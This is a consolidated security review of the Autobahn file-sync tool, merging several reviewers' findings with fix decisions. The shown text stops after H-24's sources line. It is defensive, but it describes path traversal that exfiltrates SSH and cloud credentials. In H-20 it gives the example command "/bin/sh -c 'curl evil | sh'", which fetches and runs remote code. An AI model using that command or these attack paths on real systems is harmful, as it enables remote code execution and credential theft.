# Autobahn: consolidated review findings

**Compiled:** 2026-09-24, from the six reports in `REVIEWS/`. **Revision reviewed by all sources:** commit `1180499` plus the uncommitted working tree as of 2026-09-23.

This is a merge, not a re-analysis. Every finding from every report is listed once, with duplicates across reviewers folded together. Nothing has been re-verified here; confidence labels are the reviewers' own. The purpose is to walk the items one at a time, in severity order.

## Sources

| Tag | File | Focus | Own ID scheme |
|---|---|---|---|
| ASTRA | `ASTRA-REVIEW-ALL.md` (with `ASTRA-SHORT.md` as a condensed copy) | Full repo: quality, security, reliability, performance, tests | F01–F36, P1/P2 |
| DEEPSEEK | `DEEPSEEK-SECURITY.md` | Security, static | F1–F24, I1–I3 |
| GLM | `GLM-SECURITY.md` | Security, static | H1–H2, M1–M8, L1–L9 |
| KIMI | `KIMI-SECRUITY.md` | Security, static (incl. bench, CI) | ABN-C1, H1–H12, M1–M20, L1–L16, I1–I4 |
| OPUS | `OPUS-REVIEW.md` | Full repo: correctness, security, performance, quality, tests | C1, H1–H8, M1–M18, S1–S11, P1–P11 |

## How severity was harmonized

- Tiers used here: **Critical**, **High**, **Medium**, **Low**, **Info**. ASTRA's P1 maps to High and P2 to Medium. OPUS's "Medium" security items (S1–S11) keep their tier unless another reviewer rated the same issue higher.
- When reviewers disagree, the item sits in the **highest** tier any of them assigned, and the per-reviewer ratings are shown so the disagreement is visible.
- Confidence: **Reproduced** (run against the build), **Confirmed** (full code path traced), **Likely/Suspected** (one link unverified). Taken from the reports as written.
- Line numbers are the reviewers' and may have drifted.

## Counts

| Tier | Items |
|---|---|
| Critical | 2 |
| High | 31 (30 from the reviews, plus H-31 found in the walkthrough) |
| Medium | 59 (58 from the reviews, plus M-59 found on the Mac) |
| Low | 42 (40 from the reviews, plus L-41 and L-42 found on the Mac) |
| Info / process | 6 (5 from the reviews, plus I-6 found on the Mac) |
| Performance opportunities | 14 |

## Decisions and fix specs

**Agent trust, decided 2026-09-24: two tiers.**
- **Tier 1, confinement.** Nothing a peer sends, genuine or not, may read, write or delete outside the synchronization root or the session's own state. Breaking this is a fault.
- **Tier 2, integrity and availability.** A hostile peer corrupting the tree or exhausting the controller stays a documented boundary under INVARIANTS' "genuine binaries" assumption. H-19 is the exception: it contradicts I9 as written.

Tier 1 fix specs, in `REVIEWS/fixes/`. All are proposed and not yet implemented.

| Spec | Corrects |
|---|---|
| [T1-1 Supply confinement](fixes/T1-1-supply-confinement.md) | C-2, L-36 (supply site) |
| [T1-2 Initialize identifiers](fixes/T1-2-initialize-identifiers.md) | H-18 (session and side), reusable for H-22 |
| [T1-3 Confined read and rename](fixes/T1-3-confined-read-and-rename.md) | M-5 (non-race part) |
| [T1-4 Reserved names and staging root](fixes/T1-4-reserved-names-and-staging-root.md) | M-3 (inside-root symlink arm and staging permissions) |
| [T1-5 Staging request paths](fixes/T1-5-staging-request-paths.md) | L-36 (receive sites) |

**Peering leader trust, decided 2026-09-24: deferred past v1.**
- The peering modes and config section were renamed to `peering-{conflict,alpha}-dangerously-experimental` and `[advanced.peering-dangerously-experimental]`. The old names are refused with a message pointing to `docs/peering.md`.
- `docs/peering.md` now documents every open security and collision issue below, and corrects its "no root is ever written by two controllers" claim.
- Every peer that can lead is treated as trusted like a shell on every other peer. SSH keys locked to `command="autobahn agent"` are not supported with peering.

Peering tickets, all deferred:

| Ticket | Covers |
|---|---|
| [PEER-1 Attach policy](fixes/PEER-1-attach-policy.md) | H-18 (root half), M-11 (attach path) |
| [PEER-2 No pushes into the alpha](fixes/PEER-2-no-pushes-into-alpha.md) | H-31 (new) |
| [PEER-3 Pushed session id](fixes/PEER-3-pushed-session-id.md) | H-22 |
| [PEER-4 Pushed commands and roots](fixes/PEER-4-pushed-commands-and-roots.md) | H-20, H-21 (documented boundary; locked-down key support as a future feature) |
| [PEER-5 Attach socket](fixes/PEER-5-attach-socket.md) | M-1 |
| [PEER-6 Fence and lease](fixes/PEER-6-fence-and-lease.md) | H-9, H-10, M-42 |
| [PEER-7 Ancestor replica](fixes/PEER-7-ancestor-replica.md) | H-11, L-10, fabricated history |
| [PEER-8 Identity, config, handoff](fixes/PEER-8-identity-config-handoff.md) | M-43, M-44, M-45 |

**Local users on a shared host, decided 2026-09-24.**
- **Other users with no race needed are a fault.** This covers default permissions and predictable paths in the shared `/tmp`. The code's own comments say synced trees often hold credentials, and it sets published files to `0600` for that reason.
- **Races against a local process that can write the synced tree stay a documented boundary,** under the single-user model in `docs/correctness/RETAINED.md` §2. §2 is to be extended to cover reads (H-24).
- **Refuse to run as root by default** (LOCAL-08). That removes the one deployment RETAINED says would turn these races into privilege escalation. `default_owner` needs root, so that deployment exists today.
- **The cheap part of the race class is fixed anyway.** The scanner's file opens get the T1-1 pattern (LOCAL-09).

Local-user tickets:

| Ticket | Covers | Status |
|---|---|---|
| [LOCAL-01 Private fs helpers](fixes/LOCAL-01-private-fs-helpers.md) | Building block for LOCAL-02 to 06 | Proposed |
| [LOCAL-02 State and config permissions](fixes/LOCAL-02-state-and-config-permissions.md) | L-1, L-2 | Proposed |
| [LOCAL-03 Staging temporaries](fixes/LOCAL-03-staging-temporaries.md) | M-3 (rest; T1-4 covers the directory) | Proposed |
| [LOCAL-04 Diff scratch](fixes/LOCAL-04-diff-scratch.md) | H-26, M-4 | Proposed |
| [LOCAL-05 Control socket fallback](fixes/LOCAL-05-control-socket-fallback.md) | M-2 | Proposed |
| [LOCAL-06 Update workspace](fixes/LOCAL-06-update-workspace.md) | M-18 (workspace part) | Proposed |
| [LOCAL-07 Bench work dirs](fixes/LOCAL-07-bench-work-dirs.md) | M-20 | Proposed |
| [LOCAL-08 Refuse root](fixes/LOCAL-08-refuse-root.md) | L-6 | Proposed |
| [LOCAL-09 Scanner file opens](fixes/LOCAL-09-scanner-file-opens.md) | M-16, H-24 (file level) | Proposed |
| [LOCAL-10 Descriptor-relative rewrite](fixes/LOCAL-10-descriptor-relative-rewrite.md) | H-24 (directory level), M-5 (race), L-5 | Boundary, not scheduled; RETAINED doc change now |
| [LOCAL-11 Hardlink chmod](fixes/LOCAL-11-hardlink-chmod.md) | L-3 | Proposed |

L-4 is covered by [T1-5](fixes/T1-5-staging-request-paths.md). M-1 is deferred with peering as PEER-5.

**Release integrity, decided 2026-09-24.**
- **`install.sh` fails closed and verifies the agent bundle,** in v1.
- **Releases are signed with minisign.** The key lives in the approval-gated `release` environment, and the updater verifies with a built-in public key.
- **A first `curl | sh` install is documented as trusting GitHub and TLS only.**

| Ticket | Covers | Status |
|---|---|---|
| [REL-1 Release integrity](fixes/REL-1-release-integrity.md) | M-17, H-28, I-3 | Proposed. Step 1, the strict installer, is for v1. Step 2, signing, is for v1 or next. |

**Supported platforms, decided 2026-09-24: FreeBSD dropped for now, and both it and Intel Macs go on the wishlist.**
- **CI.** The FreeBSD job is removed from `.github/workflows/ci.yml`, which removes the FreeBSD half of H-17.
- **Docs.** README, `docs/how-it-works.md`, `docs/development.md`, `docs/support-boundaries.md` and `docs/safety.md` no longer mention FreeBSD or the BSDs, and nothing about either platform is added to the docs. `docs/correctness/INVARIANTS.md` still names FreeBSD in its technical description of the rename fallback, and was left as is.
- **Wishlist.** `WISHLIST.md`, renamed from `FUTURE-FEATURES.md`, holds both:
  - **FreeBSD as a supported platform.** Covers what a self-builder gets today, what shipping it would take, the cost, the limits, and a manual-only CI job as a first step.
  - **Intel Macs as a tested platform.** The Intel build is still published and accepted by `install.sh`, but untested. The options are an Intel runner or a test under Rosetta; stopping publication is the alternative.

**Benchmark tooling, decided 2026-09-24.**
- **The standard.** Bench code must never harm the machine it runs on and must never produce wrong numbers. Everything under that standard is a fault to fix; nothing beyond it is required.
- **Bench stays out of CI.** `paths-ignore: bench/**` stays in `ci.yml`, and no bench job is added. The checks in each ticket run locally when the ticket is worked.
- **The observer is not authenticated beyond** a loopback default and write confinement.

| Ticket | Covers | Kind |
|---|---|---|
| [BENCH-1 Observer listener](fixes/BENCH-1-observer-listener.md) | H-14 | Harms the machine |
| [BENCH-2 `ab.sh` corpus](fixes/BENCH-2-ab-corpus.md) | H-15 | Harms the machine |
| [BENCH-3 Orchestrator shell](fixes/BENCH-3-orchestrate-shell.md) | M-57 | Harms the machine |
| [BENCH-4 `ab.sh --remote`](fixes/BENCH-4-ab-remote.md) | M-50 | Wrong numbers |
| [BENCH-5 Result accuracy](fixes/BENCH-5-result-accuracy.md) | M-51, M-55, M-56 | Wrong numbers |
| [BENCH-6 Removed `up` command](fixes/BENCH-6-removed-up-command.md) | M-52 | Wrong numbers |

M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.

---

## Critical

### C-1. Emptied-root halt is defeated by ignored or untracked leftovers; every file on the other side is deleted

- **Sources:** OPUS C1 (Critical, Reproduced)
- **Where:** `src/session/mod.rs:1081-1093` (`one_side_emptied_root`), `src/tree/reconcile.rs` (paranoid rule skips `path.is_empty()`)
- **What:** Emptiness is judged by `children().is_empty()`. Ignored entries, FIFOs, sockets and oversized files are recorded as `Untracked` children, so a root holding only `.DS_Store` is not "gone". The halt does not fire, reconciliation sees every ancestor child as deleted on that side, and it emits a deletion for every file on the other side, in every mode including `two-way-paranoid`. Reproduced with a 20-file ancestor: `halted=false`, 20 deletions for beta.
- **Triggers:** unmounted volume whose mountpoint keeps a `.DS_Store` or `.git`; a wipe that leaves `.git` or `node_modules`; a restore that recreates only dotfiles.
- **Fix:** decide emptiness by synchronizable children in both `one_side_emptied_root` and the paranoid `empty` closure; add the shape to `emptied_root_detection`; teach the reconcile proptest generator to place `Untracked` nodes at every depth including the root.
- **Confirmed again (2026-09-24, macOS, `d7c2e21`):** read from the other direction while preparing MAC-BENCH 7a. `one_side_emptied_root` (`src/session/mod.rs:1335`) judges a side gone by `children().is_empty()`, and `src/scan/mod.rs:730` records an ignored entry as an `Untracked` child. So a path being *in the ignore list* does not protect it — `.DS_Store` is ignored by the shipped defaults and still keeps the root from reading empty. The check in MAC-BENCH 7a should be worded as "any leftover entry, ignored or not" rather than naming one file.

### C-2. Arbitrary local file read and exfiltration via unvalidated `StagingNeed` paths in `supply_from`

- **Sources:** KIMI ABN-C1 (Critical, Confirmed); OPUS S2 (Medium, Confirmed)
- **Where:** `src/endpoint/local.rs:841` (`supply_from`), enabled by `src/endpoint/remote.rs:549,564-575`, `src/session/mod.rs:995`, `src/endpoint/local.rs:1212-1218`
- **What:** The destination's `StageBegin` answer is accepted verbatim. The only filter is digest-based removal of speculated needs. `supply_from` then does `self.root.join(path)` and `File::open`, streaming the result to the peer. Absolute paths replace the root, `..` traverses out, and `File::open` follows symlinks (default `SymlinkMode::Raw`). A hostile destination answers the first staging round with `~/.ssh/id_ed25519`, `~/.aws/credentials`, etc. Naming `/dev/urandom` or a FIFO wedges the session and grows memory. Mirror direction: a hostile controller sends `SupplyOpen` to an agent, defeating forced-command `autobahn agent` hardening.
- **Fix:** validate every supply path (root-relative, no absolute/`..`/non-Normal components, no symlink crossing, reuse `validate_path`), require membership in the controller-computed request set for the round, verify streamed content against the requested digest, refuse non-regular files, bound bytes per file, apply the same in the agent-side dispatch.
- **Correction (2026-09-24):** Tier 1 fault, fixed by [T1-1](fixes/T1-1-supply-confinement.md). The spec gates on this side's *own* last snapshot, not the controller's request set. An agent answering `SupplyOpen` has no view of the controller's requests, while its snapshot is always present. Snapshot membership also enforces ignores, which the reviews missed: today a peer can pull an ignored `.env` from inside the root. The current function is `supply_from` at `src/endpoint/local.rs:855`. The same bug class shipped in rsync as CVE-2024-12086 (fixed in 3.4.0).

---

## High

### H-1. `resolve --keep X` on a path not in conflict (or whose winner matches the ancestor) deletes X on every side

- **Sources:** ASTRA F01 (P1, Reproduced); OPUS H1 (High, Confirmed)
- **Where:** `src/main.rs:2292-2300`, `2410-2530`, `src/tree/reconcile.rs:369`
- **What:** Resolution retires the losing side by deleting it and relies on ordinary reconciliation to restore it. When the winner still matches the ancestor, the next cycle propagates the new deletion instead. Reproduced: `resolve ... keep.txt --keep alpha --yes` reported "one version kept" and the file vanished from both roots. `--keep both` on an in-sync path renames it everywhere. `resolve group ./` normalizes to `""`, so `node_at` returns the root and the whole tree is retired. Keeping beta also conflicts with strict-alpha and one-way semantics. Triggers: running the same resolve twice, a stale tray click, naming an in-sync file.
- **Fix:** explicit resolution semantics that preserve the selected version and update provenance; refuse paths not in recorded conflicts unless the winner differs from the ancestor; reject empty path; coordinate with running workers. Tests: every mode and winner, already-agreed files, repeated resolution, stale conflict records, directories, fan-out, then further cycles.

### H-2. Manual `sync` bypasses root-overlap and topology protection

- **Sources:** ASTRA F02 (P1, Reproduced)
- **Where:** `src/main.rs:939`
- **What:** Explicit-root `sync` skips the topology checks that configured sessions run; neither endpoint construction nor `Session::new` enforces them. Syncing `tree/source` into `tree` with `one-way-alpha` removed the source directory itself.
- **Fix:** enforce topology validation at a shared construction boundary before opening endpoints. CLI tests for equal roots, nested roots, aliases, destination containing its source.

### H-3. A transition offers a stale fold labeled with the observer's new generation; a shared root can roll its baseline back

- **Sources:** ASTRA F03 (P1, Reproduced); OPUS H3 (High, Confirmed; regression introduced by `17715e9`)
- **Where:** `src/endpoint/local.rs:1505-1507`, `1542-1543`, `src/endpoint/observer.rs:509-520`
- **What:** `offer_baseline` refuses only when `based_on < baseline_generation`. The caller sets `seen_generation = observer.generation()` after invalidating and passes that, so the refusal can never fire. Reproduced with two endpoints sharing one observer: B deleted `right/y` and rescanned; A deleted unrelated `left/x` from its older snapshot; B's next scan reported `right/y` present although absent on disk. Dirty marks for the unrelated change may already be consumed, so nothing corrects it until the 120 s full walk. The same line swallows wake-ups that land between the lease scan and the post-write announcement.
- **Fix:** capture the lease generation before the first `invalidate` and offer with that; advance `seen_generation` only by the endpoint's own bumps. Test: two real endpoints, two paths, an intervening scan, a transition through `LocalEndpoint::transition`, watcher and polling.

### H-4. Directory-to-directory replacement is invisible to incremental scans

- **Sources:** OPUS H2 (High, Reproduced)
- **Where:** `src/scan/mod.rs:140-151` (`DirtyPaths::mark` sets `relist` only on the parent), `:554-589` (`scan_directory` adopts the baseline's unmarked children without `stat`)
- **What:** After `mv A/live A/old && mv A/staging A/live`, B showed `live/f1=old1`, `old/f1=old1`, and `staging/` was deleted on B; the new content existed only on A for about 120 s. Breaks I1 and the "incremental equals full" contract. Triggers: atomic deploy swaps, `rmdir x; mkdir x; populate`, renaming over an empty directory.
- **Fix:** set `relist = true` on the marked node itself, or have directory Create/Rename events request a relist. Add a dir-swap case to `incremental_scans_agree_with_full_scans`.

### H-5. Deep local trees overflow the scanner's 2 MiB thread stack and abort the whole process

- **Sources:** OPUS H4 (High, Reproduced); KIMI ABN-L9 (Low, Suspected)
- **Where:** `src/scan/mod.rs:531` onward (`scan_directory` → `walk` → `scan_entry`); no `stack_size` set anywhere
- **What:** `autobahn sync` succeeded at depth 1,400 and aborted with `fatal runtime error: stack overflow` at 1,700 and 1,850. Paths at that depth are ~3.5 KB, under `PATH_MAX`, so the ENAMETOOLONG guard never fires. Abort kills every session; a login service crash-loops since the tree persists. `recount`, `tree::apply`, `diff`, `validate`, reconcile and serde recurse the same way.
- **Fix:** spawn scan/session/router threads with an explicit large stack, or cap depth and mark deeper directories `Problematic`.

### H-6. Hostile peer sends a deeply nested `Node`; recursive bincode decode overflows the stack (both directions)

- **Sources:** KIMI ABN-H7 (High, Likely); GLM M3 (Medium); OPUS H4 (mentioned as I9-B)
- **Where:** `src/transport/mux.rs:166` (router thread), `src/transport/mod.rs:414` (agent dispatcher), `src/endpoint/remote.rs:241`; consumers `tree/mod.rs:337` (`validate`), `tree/reconcile.rs:133`, `local.rs:2103`, `Drop`
- **What:** bincode 1.3 has no depth limit; ~20–30 bytes per level means a few-thousand-deep chain fits in ~100 KB. SIGSEGV, not a catchable panic, mid-cycle. Symmetric: a hostile peering leader kills follower agents via `AncestorCheckpoint{ ancestor: Option<Node> }`. `INVARIANTS.md` documents this as accepted boundary I9-B under a "genuine agent binaries" model.
- **Fix:** depth budget during decode (custom `Deserialize`) or a streaming validator; make `Drop` for `Node` iterative.

### H-7. File transfer buffers the complete file or delta in memory before returning its first frame

- **Sources:** ASTRA F11 (P1, Reproduced with allocation measurements); OPUS H5 (High, Confirmed); KIMI ABN-H8 (High, Confirmed)
- **Where:** `src/endpoint/local.rs:787-872` (`buffer_delta` → `supply_from`), `:1236` (`supply_pull`), `:848-866`
- **What:** `supply_pull` calls `buffer_delta` synchronously; the batch limit applies afterwards. With an empty or mismatching base signature the delta is the whole file. Measured: requesting one frame added ~33.6 MB live heap for a 32 MiB file and ~134.4 MB for 128 MiB. `max_file_size` defaults to unlimited, so a 20 GB image allocates 20 GB in the supervisor. KIMI adds the hostile arm: a destination supplying one fake `BlockHash` forces the non-streaming path for the largest file in the tree.
- **Fix:** keep an open `File` in `SupplyState` and read lazily; run `deltify` on a helper thread feeding a bounded channel; fall back to chunked streaming when a delta exceeds a threshold. Measure memory and time-to-first-batch across sizes.

### H-8. Size-excluded, special-file and other `Untracked` content is destroyed when its parent directory is deleted

- **Sources:** OPUS H6 (High, Confirmed); KIMI ABN-M11 (Medium, Confirmed)
- **Where:** `src/endpoint/local.rs:~2495-2531`, `src/tree/reconcile.rs:53-85` (`blocking` comment claims the opposite), `docs/configuration.md:73`
- **What:** `Untracked` covers pattern ignores, files over `max_file_size`, sockets, FIFOs, devices, and ignored symlinks. The "excluded content goes with the directory" branch removes all of them. Shapes: a beta-only 2 GB dump under a directory alpha deletes; an edit that grows `d/a` past the limit while beta deletes `d` is treated as a pure deletion. Also wipes `.git`, `.env` and local build state. The two layers hold opposite beliefs.
- **Fix:** carry a reason on `Untracked` (`Ignored`, `TooLarge`, `Special`); let only `Ignored` be removed by directory deletion, others refuse and surface a conflict; treat "untracked on one side, present in ancestor" as not deleted; surface every excluded entry destroyed as a Problem; fix the comment.

### H-9. Peering: an already-authorized channel is not fenced after takeover; the fence is checked only when a lease is presented

- **Sources:** ASTRA F04 (P1); OPUS H7 (High, Confirmed); GLM L5 (Low); KIMI (noted under H1)
- **Where:** `src/transport/mod.rs:537-590`
- **What:** `fence` is set only when a `Request::Lease` is refused. A accepted at term 1 pauses mid-staging; B takes over at term 2; A resumes and its `StagePush`/`Transition`/ancestor mutations are still accepted until its next lease request. Nothing renews the lease during a cycle, so a cycle longer than `ttl + failover_after` (150 s) keeps writing after another beta took over. A controller that simply omits the Lease request writes without any lease. Contradicts `docs/peering.md` "No root is ever written by two controllers".
- **Fix:** retain each channel's accepted leader/term and validate against authoritative host-wide state at every mutation; renew on a timer; have the agent refuse writes once `renewed_at + ttl` passes on its own clock.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-6](fixes/PEER-6-fence-and-lease.md). Documented in `docs/peering.md`.

### H-10. Peering: concurrent lease admission is an unlocked read-check-write; competing leaders can both be accepted

- **Sources:** ASTRA F05 (P1); OPUS H7 (High, Confirmed)
- **Where:** `src/transport/mod.rs:577`, `src/supervisor/peer.rs:54`, `src/peering.rs:227-277`
- **What:** Two processes read the same old lease, independently accept different leaders at the next term, both write, both return success. A delayed lower-term write overwrites a higher term. Atomic file replacement does not make the transaction atomic. No fsync, so power loss can roll the term back.
- **Fix:** serialize admission across processes (`flock` around check-and-write) including agent requests, local takeover, renewal and handoff; fsync. Test simultaneous equal-term candidates and delayed lower-term writers.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-6](fixes/PEER-6-fence-and-lease.md). Documented in `docs/peering.md`.

### H-11. Peering can overwrite a newer journal-only ancestor with an older replica

- **Sources:** ASTRA F06 (P1)
- **Where:** `src/peering.rs:734` (`adopt_newer_copy`)
- **What:** Local generation is assumed zero when the checkpoint file is absent, ignoring a valid journal-only ancestor (small histories stay in `ancestor.journal` until compaction). Generation 10 in the journal is replaced by replica generation 9. Lost provenance turns a deliberate edit or revert into an apparent unchanged value.
- **Fix:** always use the journal-aware `stored_generation`; check replica existence using both checkpoint and journal. Test journal-only local newer than replica, and journal-only replica adoption.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-7](fixes/PEER-7-ancestor-replica.md). Documented in `docs/peering.md`.

### H-12. Configured overlap validation uses nonunique display labels as session identities

- **Sources:** ASTRA F07 (P1)
- **Where:** `src/config.rs:1338`
- **What:** Cross-session comparisons are skipped when `plan.display()` matches. `host:/tree` and `host:/tree/nested` in one group both display as `group@host`, so their writable overlap escapes validation. Reused labels also cause ambiguous progress, alert and UI associations.
- **Fix:** compare session identities or plan indices; carry a stable typed identity through control, progress, alerts and UI.

### H-13. Disabling the final active session leaves the previous workers running under live reload

- **Sources:** ASTRA F08 (P1)
- **Where:** `src/supervisor/reload.rs:40`
- **What:** `disable` saves a configuration with zero active plans; the reloader rejects it as describing no sessions and retains the previous workers. Removing the last group behaves the same.
- **Fix:** distinguish startup policy from live-reconfiguration policy; allow an empty live config, stop workers, keep the control/reload service. Test disable-last, verify stop, enable, verify resume.

### H-14. Benchmark observer accepts unauthenticated arbitrary file writes on `0.0.0.0`

- **Sources:** ASTRA F09 (P1)
- **Where:** `bench/harness/src/observer.rs:48,83,149`, `bench/smoke.sh:73`
- **What:** `floor_arm` takes an unrestricted path and payload, `floor_write` writes it. No auth, no root confinement. Any reachable client can overwrite shell rc or SSH authorization files as the benchmark user. The local smoke test starts this listener. (EC2 security group restricts non-SSH traffic to fleet members.)
- **Fix:** authenticate, confine to a scratch root without symlink escapes, default local runs to a private socket or protected loopback, bound request sizes and workers.
- **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-1](fixes/BENCH-1-observer-listener.md).

### H-15. The A/B benchmark `rm -rf`s an arbitrary supplied corpus directory

- **Sources:** ASTRA F10 (P1)
- **Where:** `bench/ab.sh:49,106`
- **What:** `--corpus DIR` assigns to `CORPUS`; every leg runs `rm -rf "$dest" "$state" "$CORPUS"`. Supplying a checkout destroys it.
- **Fix:** treat input as read-only and copy into an owned temp dir, or require a verified disposable destination; remove only harness-created directories.
- **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-2](fixes/BENCH-2-ab-corpus.md).

### H-16. The formal-spec gate reports success when TLC fails

- **Sources:** ASTRA F12 (P1, Reproduced with a controlled Java replacement)
- **Where:** `spec/check.sh:41`
- **What:** TLC output is piped into `grep` without `pipefail`; the filter matches `Error`, `violated`, `Deadlock`, `Temporal`. A fake Java printing an invariant violation and exiting 17 made `check.sh quick` exit 0. Both ordinary and full-spec CI depend on this. The trace-validation branch accepts an empty trace directory as success.
- **Fix:** preserve TLC's exit status independently of filtering; reject an empty trace directory; wrapper tests for failure, success and missing traces.

### H-17. CI on `main` is red; the spec and macOS jobs have not run on the current head

- **Sources:** OPUS H8 (High, Confirmed via run 35920255058); ASTRA validation (Clippy failures)
- **Where:** `src/endpoint/local.rs:1588` (`large_enum_variant`, `Receiving`, ≥2,064 bytes), `src/endpoint/remote.rs:773,786` (`type_complexity`); FreeBSD `update::tests::this_machine_has_a_published_build` and `the_update_naming_matches_the_agent_bundle_naming` fail with "no release build for freebsd-x86_64"
- **What:** `spec` and `mac` depend on `linux`, so neither has run on `1180499`. README and `support-boundaries.md` advertise FreeBSD but `install.sh`, `build-agents.sh` and `release.yml` do not build it. Locally `cargo test --release` passes (478 tests, OPUS) and 474 pass / 1 fail (ASTRA, see M-46).
- **Fix:** three clippy fixes; gate the FreeBSD update tests; either ship FreeBSD or stop advertising it.
- **Resolution (2026-09-24):** The FreeBSD half is resolved by dropping FreeBSD for now; see the platforms decision above and `WISHLIST.md`. The three clippy errors remain.
- **New (2026-09-24):** The latest CI run, 35946282106, also failed on Linux arm64 in `fan_out_races::two_betas_edit_different_files_and_both_land` (`tests/e2e.rs:1869`). None of the reviews mention it, and one run does not show whether it is flaky.

### H-18. Wire-controlled `Initialize.session`, `side` and `root` are unvalidated; `session` reaches `remove_dir_all`, and attach-mode leaders choose the follower's root

- **Sources:** DEEPSEEK F2 (High); KIMI ABN-H1 (High, Confirmed) and ABN-H4 (High, Confirmed); GLM M5 (Medium); OPUS Low ("pushed peering files trusted")
- **Where:** `src/transport/mod.rs:878-890` (`create_endpoint`, `:885` `remove_dir_all(staging_area.join(&initialize.session))`), `src/endpoint/local.rs:2724-2748` (`staging_root_for`), `src/peering.rs:290-292` (`ancestor_copy_path`), reachable via `src/transport/mod.rs:920-941` and `src/supervisor/peer.rs:290-299`
- **What:** No consumer of `Initialize` checks these strings. `session = ".."` deletes `~/.autobahn` on channel open; `"../../.."` reaches `$HOME`. Session/side name the staging directory (escaping `~/.autobahn/staging`; `sweep_staging` then deletes 64-hex-named files at the chosen location). `ancestor_copy_path` writes over another session's real ancestor store. `root` is taken verbatim after `~` expansion and becomes the confinement boundary: in attach mode the remote leader chooses `/` or `$HOME` and gets `Scan`, `ReadFile`, `StagePush`, `Transition`, `Rename` there. Normally self-inflicted; in peering attach mode (`ssh <leader> autobahn peering attach`) or against a forced-command agent the attacker is the controller.
- **Fix:** validate `session`/`side` as plain single names (`validate_name` rules, strict charset, length cap) before any filesystem use; never `remove_dir_all` a wire-derived path; in attach mode pin `root` and session id to the follower's own configured values and refuse mismatches; consider validating `ignores`, `default_owner`, `default_group`.
- **Correction (2026-09-24):** The session and side half is a Tier 1 fault, fixed by [T1-2](fixes/T1-2-initialize-identifiers.md). An exact rule is possible, not just a loose charset. Session ids always come from `session_identifier` and are 32 lowercase hex characters, and side is always `alpha` or `beta`. The spec deletes the legacy `remove_dir_all` (now at `src/transport/mod.rs:929`). Pinning `root` in attach mode is deferred past v1: ticket [PEER-1](fixes/PEER-1-attach-policy.md).

### H-19. Agent-supplied `ScanDelta.length` and `block_size` drive unbounded allocations on the controller

- **Sources:** DEEPSEEK F1 (High); KIMI ABN-H6 (High, Confirmed); GLM M2 (Medium); OPUS S1 (Medium, Confirmed)
- **Where:** `src/endpoint/remote.rs:212-235` (`Vec::with_capacity(header.length as usize)` at `:219`), `src/rsync/mod.rs:135` (`vec![0u8; block_size as usize]`), `src/endpoint/local.rs:866`; header at `src/protocol.rs:76-90`
- **What:** `length` is a peer `u64` used before any byte arrives; `u64::MAX` is a capacity-overflow abort, `2^40` an OOM. `block_size` is never clamped to `[1024, 65536]`: `u32::MAX` zeroes ~4 GiB per scan, `1` yields one BLAKE3 call per byte. The expansion check runs once per batch, so a 64 MiB frame of `Blocks{0,N}` ops expands millions of times before being caught. Worker panics propagate through `handle.join().expect(...)` (`supervisor/mod.rs:565`), killing the supervisor; service restart loops re-hit the payload. Violates documented invariant I9.
- **Fix:** never `with_capacity` from a peer-declared length; cap `length` at a protocol maximum; reject `block_size` outside range in `Signature::validate` and at the `ScanDelta` boundary; cap `hashes.len()`; bound each op before `patch`.

### H-20. Peering: leader-pushed `config.toml` carries `agent_command`, executed on followers at failover (delayed RCE)

- **Sources:** KIMI ABN-H2 (High, Confirmed); DEEPSEEK I2 (Info); OPUS Low
- **Where:** `src/peering.rs:533-536` (`..group.clone()` in `derive_star`), `src/supervisor/mod.rs:1614-1617`, `src/config.rs:880,1602`
- **What:** The pushed group's `agent_command`, `ignores`, modes, `default_owner`/`default_group` survive verbatim. When the follower takes the lead, `open_endpoints` executes that argv. A hostile leader pushes `agent_command = "/bin/sh -c 'curl evil | sh'"` and goes dark; every follower runs it after the lease expires. Alert hooks are not carried (follower built without `.with_alerts`).
- **Fix:** force `agent_command = None` on turned groups and reject pushed configs that set it; force owner fields to `None`; document that a push grants tree-shape knowledge only; longer term sign or session-bind pushed configs.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-4](fixes/PEER-4-pushed-commands-and-roots.md). Documented in `docs/peering.md`.

### H-21. Peering: a hostile leader chooses the follower's local sync root via the pushed `name` file

- **Sources:** KIMI ABN-H3 (High, Likely); GLM L4 (Low)
- **Where:** `src/peering.rs:517-520`, `448-560` (`derive_star`), `src/supervisor/peer.rs:45-70`
- **What:** The follower's local alpha root is the path part of the leader-pushed `name`. Nothing pins membership to what the host originally agreed. After failover the victim two-way-syncs `~/.ssh` with the attacker's hosts.
- **Fix:** pin membership locally (TOFU record written by a local pair command); refuse pushed names/configs whose own path differs; alert on pushed changes that alter roots or modes.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-4](fixes/PEER-4-pushed-commands-and-roots.md). Documented in `docs/peering.md`.

### H-22. Peering: pushed `sessions/<group>` identifier escapes the state root

- **Sources:** KIMI ABN-H5 (High, Confirmed)
- **Where:** `src/peering.rs:570-573`; sinks `src/supervisor/mod.rs:1452` (session dir, lock, ancestor store), `:2280-2303` (status JSON)
- **What:** `is_pushable` validates pushed file names but not content; `trim()` leaves `../../<anything>`. On failover the follower creates session state at escaped locations; status writes replace same-named targets.
- **Fix:** validate the identifier charset at `read_pushed_file` and in `SessionPlan::attached_alpha`.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-3](fixes/PEER-3-pushed-session-id.md) applies the `is_session_identifier` check from [T1-2](fixes/T1-2-initialize-identifiers.md). Documented in `docs/peering.md`.

### H-23. Peer-crafted rsync `Signature` drives quadratic CPU and multi-GB index memory

- **Sources:** KIMI ABN-H9 (High, Likely)
- **Where:** `src/rsync/mod.rs:222-225` (unconditional `weak_index`), `:281-285` (linear bucket scan per position), via `local.rs:866`
- **What:** `Signature::validate` checks structure but not `hashes.len()`. ~10⁸ hashes fit in the 4 GiB cap and build a multi-GB `HashMap`; colliding weak checksums force BLAKE3 plus a bucket scan per byte.
- **Fix:** cap `hashes.len()` (flat or derived from base size); bound per-position candidate scans.

### H-24. Scanner directory-swap TOCTOU: a directory replaced by a symlink mid-walk exports out-of-root content to the peer

- **Sources:** KIMI ABN-H10 (High, Likely); OPUS Low ("the scanner walks by path")
